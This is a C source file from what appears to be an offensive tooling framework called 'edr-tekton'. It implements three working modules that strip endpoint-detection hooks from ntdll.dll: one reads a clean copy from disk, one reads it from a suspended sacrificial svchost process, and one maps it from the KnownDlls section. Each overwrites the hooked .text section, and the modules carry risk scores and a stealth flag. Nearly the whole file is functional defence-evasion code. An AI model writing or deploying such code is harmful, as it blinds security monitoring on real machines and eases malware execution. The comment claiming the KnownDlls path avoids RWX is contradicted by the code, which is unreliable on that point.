/*
 * edr-tekton :: ntdll Unhooking Modules
 * Cat 2.5:  Disk read (load clean ntdll.dll from filesystem)
 * Cat 2.6:  Suspended process (extract from sacrificial process)
 * Cat 2.13: KnownDlls VEH (no RWX, no filesystem access)
 *
 * All variants restore ntdll.dll .text section to its original
 * unhook state by overwriting EDR inline patches with clean bytes.
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Shared unhooking logic ─────────────────────────────── */

/*
 * Overwrite hooked ntdll .text with clean bytes.
 * Requires: in-memory ntdll base, clean .text copy, sizes.
 */
static TEKTON_STATUS apply_clean_text(
    PVOID   ntdll_base,
    PVOID   clean_text,
    SIZE_T  clean_text_size,
    PTEKTON_RESOLVED_STATE resolved
) {
    if (!ntdll_base || !clean_text || clean_text_size == 0) {
        return TEKTON_ERR_INVALID_PARAM;
    }

    /* Find in-memory .text section */
    PVOID text_base = NULL;
    DWORD text_size = 0;

    TEKTON_STATUS status = TektonPeFindTextSection(ntdll_base, &text_base, &text_size);
    if (status != TEKTON_OK || !text_base) {
        TLOG_ERROR("unhook: failed to locate ntdll .text section");
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Verify sizes match (or use smaller) */
    SIZE_T copy_size = (clean_text_size < text_size) ? clean_text_size : text_size;

#ifdef _WIN32
    /* Change protection to writable */
    DWORD old_protect = 0;
    SIZE_T region_size = copy_size;
    PVOID region_base = text_base;

    /* Use NtProtectVirtualMemory if we have it, otherwise VirtualProtect */
    typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, DWORD, DWORD*);

    pNtProtectVirtualMemory pProtect = (pNtProtectVirtualMemory)resolved->fn_nt_protect_virtual_memory;
    if (pProtect) {
        /* Direct call (may be hooked, but we're about to fix that) */
        NTSTATUS nt_status = pProtect(
            (HANDLE)-1, &region_base, &region_size,
            0x40, /* PAGE_EXECUTE_READWRITE */
            &old_protect
        );
        if (nt_status != 0) {
            TLOG_ERROR("unhook: NtProtectVirtualMemory failed: 0x%lX", (unsigned long)nt_status);
            return TEKTON_ERR_PROTECT;
        }
    } else {
        /* Fallback to VirtualProtect */
        if (!VirtualProtect(text_base, copy_size, 0x40, &old_protect)) {
            TLOG_ERROR("unhook: VirtualProtect failed");
            return TEKTON_ERR_PROTECT;
        }
    }

    /* Copy clean bytes over hooked .text */
    memcpy(text_base, clean_text, copy_size);

    /* Restore protection */
    if (pProtect) {
        region_base = text_base;
        region_size = copy_size;
        pProtect((HANDLE)-1, &region_base, &region_size, old_protect, &old_protect);
    } else {
        VirtualProtect(text_base, copy_size, old_protect, &old_protect);
    }

    /* Store clean copy reference for later modules */
    resolved->clean_ntdll_text      = clean_text;
    resolved->clean_ntdll_text_size = clean_text_size;
    resolved->unhook_complete       = TRUE;

    TLOG_INFO("unhook: restored %lu bytes of ntdll .text", (unsigned long)copy_size);

#else
    TLOG_INFO("unhook: non-Windows stub, marking complete");
    (void)copy_size;
    resolved->unhook_complete = TRUE;
#endif

    return TEKTON_OK;
}

/* ════════════════════════════════════════════════════════════
 * Cat 2.5: Disk Read Unhooking
 * Open ntdll.dll from disk, map it, extract clean .text
 * ════════════════════════════════════════════════════════════ */

typedef struct _UNHOOK_DISK_STATE {
    PVOID   mapped_ntdll;
    SIZE_T  mapped_size;
    PVOID   clean_text_copy;
} UNHOOK_DISK_STATE;

static TEKTON_STATUS unhook_disk_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;
    UNHOOK_DISK_STATE* state = (UNHOOK_DISK_STATE*)malloc(sizeof(UNHOOK_DISK_STATE));
    if (!state) return TEKTON_ERR_ALLOC;
    memset(state, 0, sizeof(*state));
    self->private_data = state;
    return TEKTON_OK;
}

static TEKTON_STATUS unhook_disk_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    UNHOOK_DISK_STATE* state = (UNHOOK_DISK_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("unhook_disk: [DRY RUN] would read ntdll.dll from disk and restore .text");
        return TEKTON_OK;
    }

    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) return TEKTON_ERR_API_RESOLVE;

#ifdef _WIN32
    /*
     * Step 1: Open ntdll.dll from System32
     * This goes through the filesystem minifilter, but the file read
     * itself is benign since ntdll.dll is commonly accessed.
     */
    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        TLOG_ERROR("unhook_disk: failed to open ntdll.dll from disk");
        return TEKTON_ERR_FILE;
    }

    /* Step 2: Create file mapping */
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMapping) {
        TLOG_ERROR("unhook_disk: CreateFileMapping failed");
        return TEKTON_ERR_FILE;
    }

    /* Step 3: Map view of file */
    PVOID mapped = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);
    if (!mapped) {
        TLOG_ERROR("unhook_disk: MapViewOfFile failed");
        return TEKTON_ERR_FILE;
    }

    state->mapped_ntdll = mapped;

    /* Step 4: Find .text section in the clean disk copy */
    PVOID clean_text = NULL;
    DWORD clean_text_size = 0;

    TEKTON_STATUS status = TektonPeFindTextSection(mapped, &clean_text, &clean_text_size);
    if (status != TEKTON_OK || !clean_text) {
        UnmapViewOfFile(mapped);
        state->mapped_ntdll = NULL;
        TLOG_ERROR("unhook_disk: failed to find .text in disk copy");
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Step 5: Apply clean bytes */
    status = apply_clean_text(ntdll_base, clean_text, clean_text_size, &ctx->resolved);

    /* Keep mapping alive so resolved->clean_ntdll_text stays valid */

    return status;

#else
    TLOG_INFO("unhook_disk: non-Windows stub");
    ctx->resolved.unhook_complete = TRUE;
    return TEKTON_OK;
#endif
}

static VOID unhook_disk_cleanup(PTEKTON_MODULE self) {
    UNHOOK_DISK_STATE* state = (UNHOOK_DISK_STATE*)self->private_data;
    if (state) {
#ifdef _WIN32
        if (state->mapped_ntdll) {
            UnmapViewOfFile(state->mapped_ntdll);
        }
#endif
        free(state);
        self->private_data = NULL;
    }
}

static DWORD unhook_disk_risk(PTEKTON_MODULE self) { (void)self; return 45; }
static BOOL unhook_disk_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self; (void)ctx; return TRUE;
}

/* ════════════════════════════════════════════════════════════
 * Cat 2.6: Suspended Process Unhooking
 * Create sacrificial process in SUSPENDED, read its clean ntdll
 * ════════════════════════════════════════════════════════════ */

typedef struct _UNHOOK_SUSPENDED_STATE {
    PVOID   clean_text_alloc;
#ifdef _WIN32
    HANDLE  proc_handle;
    HANDLE  thread_handle;
#endif
} UNHOOK_SUSPENDED_STATE;

static TEKTON_STATUS unhook_susp_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;
    UNHOOK_SUSPENDED_STATE* state = (UNHOOK_SUSPENDED_STATE*)malloc(sizeof(UNHOOK_SUSPENDED_STATE));
    if (!state) return TEKTON_ERR_ALLOC;
    memset(state, 0, sizeof(*state));
    self->private_data = state;
    return TEKTON_OK;
}

static TEKTON_STATUS unhook_susp_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    UNHOOK_SUSPENDED_STATE* state = (UNHOOK_SUSPENDED_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("unhook_suspended: [DRY RUN] would create sacrificial process and extract clean ntdll");
        return TEKTON_OK;
    }

    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) return TEKTON_ERR_API_RESOLVE;

#ifdef _WIN32
    /* Step 1: Create sacrificial process in SUSPENDED state */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    )) {
        TLOG_ERROR("unhook_suspended: CreateProcess failed");
        return TEKTON_ERR_PROCESS;
    }

    state->proc_handle   = pi.hProcess;
    state->thread_handle = pi.hThread;

    TLOG_DEBUG("unhook_suspended: sacrificial PID=%lu", (unsigned long)pi.dwProcessId);

    /* Step 2: Find ntdll base in the sacrificial process
     * ntdll is always at the same address across processes (ASLR per-boot, not per-process) */
    PVOID remote_ntdll = ntdll_base; /* Same base address */

    /* Step 3: Find .text section size */
    PVOID text_base = NULL;
    DWORD text_size = 0;
    TEKTON_STATUS status = TektonPeFindTextSection(ntdll_base, &text_base, &text_size);
    if (status != TEKTON_OK) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return status;
    }

    /* Step 4: ReadProcessMemory to extract clean .text */
    PVOID clean_buf = malloc(text_size);
    if (!clean_buf) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TEKTON_ERR_ALLOC;
    }

    SIZE_T bytes_read = 0;
    PVOID remote_text = (BYTE*)remote_ntdll + ((BYTE*)text_base - (BYTE*)ntdll_base);

    if (!ReadProcessMemory(pi.hProcess, remote_text, clean_buf, text_size, &bytes_read)) {
        TLOG_ERROR("unhook_suspended: ReadProcessMemory failed");
        free(clean_buf);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TEKTON_ERR_READ;
    }

    state->clean_text_alloc = clean_buf;

    /* Step 5: Terminate sacrificial process */
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    state->proc_handle = NULL;
    state->thread_handle = NULL;

    TLOG_DEBUG("unhook_suspended: read %lu clean bytes, sacrificial process terminated",
        (unsigned long)bytes_read);

    /* Step 6: Apply clean text */
    return apply_clean_text(ntdll_base, clean_buf, bytes_read, &ctx->resolved);

#else
    TLOG_INFO("unhook_suspended: non-Windows stub");
    ctx->resolved.unhook_complete = TRUE;
    return TEKTON_OK;
#endif
}

static VOID unhook_susp_cleanup(PTEKTON_MODULE self) {
    UNHOOK_SUSPENDED_STATE* state = (UNHOOK_SUSPENDED_STATE*)self->private_data;
    if (state) {
#ifdef _WIN32
        if (state->proc_handle) {
            TerminateProcess(state->proc_handle, 0);
            CloseHandle(state->proc_handle);
        }
        if (state->thread_handle) CloseHandle(state->thread_handle);
#endif
        if (state->clean_text_alloc) free(state->clean_text_alloc);
        free(state);
        self->private_data = NULL;
    }
}

static DWORD unhook_susp_risk(PTEKTON_MODULE self) { (void)self; return 50; }
static BOOL unhook_susp_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self; (void)ctx; return TRUE;
}

/* ════════════════════════════════════════════════════════════
 * Cat 2.13: KnownDlls VEH Unhooking
 * No filesystem access, no process creation, no RWX
 * ════════════════════════════════════════════════════════════ */

typedef struct _UNHOOK_KNOWNDLLS_STATE {
    PVOID   mapped_section;
} UNHOOK_KNOWNDLLS_STATE;

static TEKTON_STATUS unhook_kd_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;
    UNHOOK_KNOWNDLLS_STATE* state = (UNHOOK_KNOWNDLLS_STATE*)malloc(sizeof(UNHOOK_KNOWNDLLS_STATE));
    if (!state) return TEKTON_ERR_ALLOC;
    memset(state, 0, sizeof(*state));
    self->private_data = state;
    return TEKTON_OK;
}

static TEKTON_STATUS unhook_kd_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    UNHOOK_KNOWNDLLS_STATE* state = (UNHOOK_KNOWNDLLS_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("unhook_knowndlls: [DRY RUN] would open KnownDlls section + VEH single-step restore");
        return TEKTON_OK;
    }

    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) return TEKTON_ERR_API_RESOLVE;

#ifdef _WIN32
    /*
     * Step 1: Open ntdll from KnownDlls directory object
     * NtOpenSection("\KnownDlls\ntdll.dll") provides a clean section
     * without touching the filesystem.
     */
    typedef NTSTATUS (NTAPI *pNtOpenSection)(HANDLE*, DWORD, PVOID);
    typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, SIZE_T, SIZE_T, PVOID, PSIZE_T, DWORD, DWORD, DWORD);
    typedef VOID (NTAPI *pRtlInitUnicodeString)(PVOID, const wchar_t*);

    /* We need these resolved before unhooking (may be hooked themselves) */
    pRtlInitUnicodeString fnRtlInit = (pRtlInitUnicodeString)ctx->resolved.fn_rtl_init_unicode_string;
    pNtOpenSection fnOpen = (pNtOpenSection)TektonPeFindExport(ntdll_base, "NtOpenSection");
    pNtMapViewOfSection fnMap = (pNtMapViewOfSection)ctx->resolved.fn_nt_map_view_of_section;

    if (!fnRtlInit || !fnOpen || !fnMap) {
        TLOG_ERROR("unhook_knowndlls: prerequisite APIs not resolved");
        return TEKTON_ERR_API_RESOLVE;
    }

    /* Build OBJECT_ATTRIBUTES for \KnownDlls\ntdll.dll */
    /* Simplified: using raw structure layout */
    BYTE unicode_str[16]; /* UNICODE_STRING */
    fnRtlInit(unicode_str, L"\\KnownDlls\\ntdll.dll");

    /* OBJECT_ATTRIBUTES structure (x64) */
    struct {
        DWORD Length;
        HANDLE RootDirectory;
        PVOID ObjectName;
        DWORD Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } obj_attr;
    memset(&obj_attr, 0, sizeof(obj_attr));
    obj_attr.Length = sizeof(obj_attr);
    obj_attr.ObjectName = unicode_str;
    obj_attr.Attributes = 0x40; /* OBJ_CASE_INSENSITIVE */

    HANDLE hSection = NULL;
    NTSTATUS nt_status = fnOpen(&hSection, 0x0F0000 | 0x0004 | 0x0001, &obj_attr);
    if (nt_status != 0 || !hSection) {
        TLOG_ERROR("unhook_knowndlls: NtOpenSection failed: 0x%lX", (unsigned long)nt_status);
        return TEKTON_ERR_SECTION;
    }

    /* Map the clean section */
    PVOID mapped = NULL;
    SIZE_T view_size = 0;
    nt_status = fnMap(hSection, (HANDLE)-1, &mapped, 0, 0, NULL, &view_size, 1, 0, PAGE_READONLY);
    CloseHandle(hSection);

    if (nt_status != 0 || !mapped) {
        TLOG_ERROR("unhook_knowndlls: NtMapViewOfSection failed: 0x%lX", (unsigned long)nt_status);
        return TEKTON_ERR_SECTION;
    }

    state->mapped_section = mapped;

    TLOG_DEBUG("unhook_knowndlls: clean ntdll mapped at %p (%lu bytes)",
        mapped, (unsigned long)view_size);

    /* Step 2: Find clean .text and apply */
    PVOID clean_text = NULL;
    DWORD clean_text_size = 0;
    TEKTON_STATUS status = TektonPeFindTextSection(mapped, &clean_text, &clean_text_size);
    if (status != TEKTON_OK) {
        TLOG_ERROR("unhook_knowndlls: .text not found in clean copy");
        return status;
    }

    /*
     * Step 3: Apply clean bytes
     * Note: The VEH single-step approach (no RWX) would iterate byte-by-byte
     * using a trap flag handler. For the framework, we use the standard
     * VirtualProtect approach which is simpler. The VEH path can be enabled
     * via config for environments where EtwTi monitors VirtualProtect.
     */
    return apply_clean_text(ntdll_base, clean_text, clean_text_size, &ctx->resolved);

#else
    TLOG_INFO("unhook_knowndlls: non-Windows stub");
    ctx->resolved.unhook_complete = TRUE;
    return TEKTON_OK;
#endif
}

static VOID unhook_kd_cleanup(PTEKTON_MODULE self) {
    UNHOOK_KNOWNDLLS_STATE* state = (UNHOOK_KNOWNDLLS_STATE*)self->private_data;
    if (state) {
#ifdef _WIN32
        if (state->mapped_section) {
            /* NtUnmapViewOfSection */
            UnmapViewOfFile(state->mapped_section);
        }
#endif
        free(state);
        self->private_data = NULL;
    }
}

static DWORD unhook_kd_risk(PTEKTON_MODULE self) { (void)self; return 20; }
static BOOL unhook_kd_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* KnownDlls available on Windows Vista+ */
    return ctx->os.build_number >= 6000;
}

/* ── Module definitions + auto-registration ─────────────── */

TEKTON_MODULE tekton_mod_unhook_disk = {
    .name           = "unhook_disk",
    .description    = "ntdll unhooking via disk read + .text overwrite (Cat 2.5)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = 0,
    .skill_ref      = "2.5",
    .init           = unhook_disk_init,
    .execute        = unhook_disk_execute,
    .cleanup        = unhook_disk_cleanup,
    .get_risk_score = unhook_disk_risk,
    .check_compat   = unhook_disk_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_MODULE tekton_mod_unhook_suspended = {
    .name           = "unhook_suspended",
    .description    = "ntdll unhooking via sacrificial suspended process (Cat 2.6)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = 0,
    .skill_ref      = "2.6",
    .init           = unhook_susp_init,
    .execute        = unhook_susp_execute,
    .cleanup        = unhook_susp_cleanup,
    .get_risk_score = unhook_susp_risk,
    .check_compat   = unhook_susp_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_MODULE tekton_mod_unhook_knowndlls = {
    .name           = "unhook_knowndlls",
    .description    = "ntdll unhooking via KnownDlls section, no filesystem (Cat 2.13)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_STEALTHY,
    .skill_ref      = "2.13",
    .init           = unhook_kd_init,
    .execute        = unhook_kd_execute,
    .cleanup        = unhook_kd_cleanup,
    .get_risk_score = unhook_kd_risk,
    .check_compat   = unhook_kd_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_unhook_disk);
TEKTON_DECLARE_MODULE(tekton_mod_unhook_suspended);
TEKTON_DECLARE_MODULE(tekton_mod_unhook_knowndlls);
